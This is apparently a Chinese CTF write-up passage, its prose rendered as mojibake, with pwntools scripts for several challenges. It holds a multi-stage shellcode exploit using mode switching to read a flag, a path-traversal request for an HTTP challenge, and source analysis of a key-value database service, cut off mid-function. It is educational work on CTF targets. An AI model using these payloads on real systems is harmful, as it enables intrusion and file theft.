<p>åŸºæœ¬ä¸Šæ˜¯markä½¬æä¾›çš„æ€è·¯ã€‚è†œè†œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10057</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+0x13C2)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rax, 9</span></span><br><span class="line"><span class="string">    mov rdi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rsi, 0x100</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rcx, 34</span></span><br><span class="line"><span class="string">    mov r8, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov r9, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rsi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov esp, 0x70707a70</span></span><br><span class="line"><span class="string">    mov rax, 0x23</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push 0x70707077</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ebx, 0x70707070</span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov edx, 0</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode3=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x70707170</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode4=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi ,3</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pay=asm(shellcode1,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    pay=<span class="string">&#x27;./flag\x00&#x27;</span>+asm(shellcode2,arch=<span class="string">&#x27;i386&#x27;</span>)+asm(shellcode3,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(shellcode4,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3-easy-http"><a href="#pwn3-easy-http" class="headerlink" title="pwn3 easy_http"></a>pwn3 easy_http</h2><p>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ï¼Œå°±æ˜¯ç¦äº†/<code>home/minil/flag</code>ç›®å½•ï¼Œç»•è¿‡å°±è¡Œäº†ï¼Œæ¯”å¦‚<code>/home/../home/mimil/flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10021</span>)</span><br><span class="line">pay=<span class="string">&#x27;GET /home/minil/../minil/flag\r\n&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;User-Agent: MiniL\r\n\r\n&#x27;</span></span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4-kvdb"><a href="#pwn4-kvdb" class="headerlink" title="pwn4 kvdb"></a>pwn4 kvdb</h2><p>è¿™é“é¢˜çš„ä»£ç é‡æ˜¯æˆ‘åšè¿‡çš„é¢˜ä¸­æœ€å¤§çš„ï¼Œå½“æ—¶å®¡äº†ä¸€ä¼šå®åœ¨å®¡ä¸ä¸‹å»å°±æ”¾å¼ƒäº†ï¼Œåé¢å‡ºé¢˜äººé‰´äºéš¾åº¦å¤ªå¤§ç›´æ¥æ”¾äº†æºç ï¼Œæ‰åˆè·‘æ¥çœ‹è¿™é“é¢˜ï¼Œä¸€çœ‹æºç ï¼Œå¥½å®¶ä¼™åŠ èµ·æ¥ä¸€åƒå¤šè¡Œäº†ï¼Œå…‰å®¡æ˜ç™½ä»£ç å’Œæ‰¾è§æ¼æ´èŠ±äº†ä¸€ä¸ªæ™šä¸Šã€‚ğŸ¤¦â€â™€ï¸</p>
<h3 id="0x1-ç»“æ„ä½“åŠå…³ç³»"><a href="#0x1-ç»“æ„ä½“åŠå…³ç³»" class="headerlink" title="0x1 ç»“æ„ä½“åŠå…³ç³»"></a>0x1 ç»“æ„ä½“åŠå…³ç³»</h3><p>ç¨‹åºå®ç°çš„æ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆæœ¬çš„æ•°æ®åº“ï¼ŒæŠŠé‡Œé¢çš„ç»“æ„ä½“çš„å…³ç³»æŠ½è±¡å‡ºæ¥å°±æ˜¯å¦‚ä¸‹å›¾</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511135849068.png" alt="image-20220511135849068"></p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>data_t</code>ç»“æ„ä½“äº†,æœ¬è´¨ä¸Šä»–æœ‰ä¸¤ä¸ªæˆå‘˜ï¼Œä¸€ä¸ªæˆå‘˜æ˜¯<code>uint16 type</code>ï¼Œè®°å½•çš„æ˜¯è¿™ä¸ª<code>data_t</code>ç»“æ„ä½“æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œ0-&gt;empty,1-&gt;int,2-&gt;float,3-&gt;string,ç„¶åè¿˜æœ‰ä¸€ä¸ªunionå…±ç”¨é¢˜è®°å½•æˆå‘˜å…·ä½“çš„é‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 <span class="keyword">data_integer_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> <span class="keyword">data_float_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_string_t</span> &#123;</span></span><br><span class="line">    uint32 len;</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">&#125; <span class="keyword">data_string_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_array_t</span> &#123;</span></span><br><span class="line">    uint32 count;</span><br><span class="line">    <span class="keyword">data_t</span>** items;</span><br><span class="line">&#125; <span class="keyword">data_array_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    uint16 type;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">data_integer_t</span> integer;</span><br><span class="line">        <span class="keyword">data_float_t</span> _float;</span><br><span class="line">        <span class="keyword">data_string_t</span> str;</span><br><span class="line">        <span class="keyword">data_array_t</span> <span class="built_in">array</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">data_t</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç»“æ„ä½“æ˜¯0x18å¤§å°çš„ï¼Œæ‰€ä»¥ä¼šç”³è¯·0x10å¤§å°çš„å †ï¼Œç„¶åä¸‹ä¸€ä¸ªå †å¤´çš„å‰å…«ä¸ªå­—èŠ‚ä¹Ÿç»™è¿™ä¸ªå †ç”¨ã€‚</p>
<h3 id="0x2-å¤§è‡´é€»è¾‘"><a href="#0x2-å¤§è‡´é€»è¾‘" class="headerlink" title="0x2 å¤§è‡´é€»è¾‘"></a>0x2 å¤§è‡´é€»è¾‘</h3><p>ç¨‹åºæ˜¯åˆ©ç”¨socketå’Œç”¨æˆ·è¿›è¡Œäº¤äº’çš„ï¼Œç¨‹åºçš„å¯åŠ¨è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kvdb -p 9999 -m 32 -l /dev/null -t 10 -d</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ç¨‹åºå¯¹å‘½ä»¤è¡Œå‚æ•°çš„è§£æè¿‡ç¨‹,å…¶ä¸­<code>getopt</code>å‡½æ•°å°±æ˜¯æ¯æ¬¡å–ä¸€ä¸ªé€‰é¡¹ï¼Œç„¶åæŠŠé€‰é¡¹å¯¹åº”çš„å€¼å­˜åˆ°optargä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;p:m:t:l:hd&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">               socks_server_port = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">               max_requests = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">               timeout = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">               log_file = (<span class="keyword">char</span> *)optarg;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">               run_daemon = <span class="number">1</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span></span><br><span class="line">                   &lt;&lt; <span class="string">&quot;kvdb [-p &lt;port&gt;] [-m &lt;max_clients&gt;] [-t &lt;timeout sec&gt;] [-l &lt;log file&gt;] [-d]&quot;</span></span><br><span class="line">                   &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (<span class="string">&quot;HELP: -h&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è§£æå®Œæ¯•åå¯¹å˜é‡çš„èµ‹å€¼å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socks_server_port=<span class="number">9999</span></span><br><span class="line">max_requests=<span class="number">32</span></span><br><span class="line">timeout=<span class="number">10</span></span><br><span class="line">log_file=/dev/null</span><br><span class="line">run_daemon=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±è¿›å…¥äº†<code>init_daemon()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹åç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºå°±è„±ç¦»ç»ˆç«¯äº†ï¼Œç„¶åè¿›å…¥<code>server_loop()</code>å‡½æ•°åˆ›å»ºæœåŠ¡ç«¯socketï¼Œä¸€ç›´acceptç­‰å¾…è¿æ¥ï¼Œæœ‰è¿æ¥åå†forkä¸€ä¸ªå­è¿›ç¨‹è®©å­è¿›ç¨‹å¤„ç†è¯·æ±‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">server_loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">local_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;local_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new socket (only IPv4 is supported now) */</span></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): Can not create sock_fd!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* reuse addr */</span></span><br><span class="line">    <span class="keyword">int</span> new_optval = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;new_optval,</span><br><span class="line">                   <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): setsockopt()!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_addr.sin_family = AF_INET;</span><br><span class="line">    local_addr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// listen addr</span></span><br><span class="line">    local_addr.sin_port = htons(socks_server_port);  <span class="comment">// listen port</span></span><br><span class="line">    <span class="keyword">socklen_t</span> local_addr_len = <span class="keyword">sizeof</span>(local_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock_fd, (struct sockaddr*)&amp;local_addr, local_addr_len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): bind()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sock_fd, max_requests) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): listen()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] Listen on port %d.\n&quot;</span>, getpid(), socks_server_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> client_addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;client_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(client_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* loop */</span></span><br><span class="line">        <span class="keyword">if</span> ((client_fd = accept(sock_fd, (struct sockaddr*)&amp;client_addr,</span><br><span class="line">                                &amp;client_addr_len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): accept()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* get address info */</span></span><br><span class="line">            <span class="keyword">char</span> ip_str[INET_ADDRSTRLEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">            uint16 port;</span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, ip_str, <span class="keyword">sizeof</span>(ip_str));</span><br><span class="line">            port = ntohs(client_addr.sin_port);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set TCP_NODELAY */</span></span><br><span class="line">            new_optval = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (setsockopt(client_fd, SOL_TCP, TCP_NODELAY, &amp;new_optval,</span><br><span class="line">                           <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                        <span class="string">&quot;Warnning: Can not setsockopt() for client_fd %d&quot;</span>,</span><br><span class="line">                        client_fd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* fork process */</span></span><br><span class="line">            <span class="keyword">int</span> pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// subprocess</span></span><br><span class="line">                    close(sock_fd);</span><br><span class="line">                    <span class="comment">/* set timeout */</span></span><br><span class="line">                    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">                        alarm(timeout);</span><br><span class="line">                        signal(SIGALRM, signal_handler);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] Connection Established - %s:%d\n&quot;</span>, getpid(), ip_str, port);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* handle */</span></span><br><span class="line">                    <span class="keyword">int</span> res = handle_request(client_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* normal exit */</span></span><br><span class="line">                    close_socket(client_fd);</span><br><span class="line">                    <span class="built_in">exit</span>(res);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// main process </span></span><br><span class="line">                    close(client_fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­è¿›ç¨‹è°ƒç”¨<code>handle_request(fd)</code>å‡½æ•°å¤„ç†è¯·æ±‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">handle_request</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_buf[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> op_buf[MAX_OP_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    uint16 op_len_be = <span class="number">0</span>;</span><br><span class="line">    uint16 op_len_le = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FETCH_COMMAND:</span><br><span class="line">        <span class="comment">/* check MAGIC */</span></span><br><span class="line">        <span class="built_in">memset</span>(magic_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(magic_buf));</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        <span class="keyword">if</span> (readn(sock, magic_buf, MAGIC_SIZE) != MAGIC_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(magic_buf, MAGIC, MAGIC_SIZE)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read op */</span></span><br><span class="line">        <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;op_len_be, <span class="keyword">sizeof</span>(uint16)) != <span class="keyword">sizeof</span>(uint16)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        op_len_le = BigLittleSwap16(op_len_be);</span><br><span class="line">        <span class="keyword">if</span> (op_len_le &gt; MAX_OP_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        readn(sock, op_buf, op_len_le);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find handler */</span></span><br><span class="line">        op_handler* h = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (h = &amp;accepted_ops[<span class="number">0</span>]; 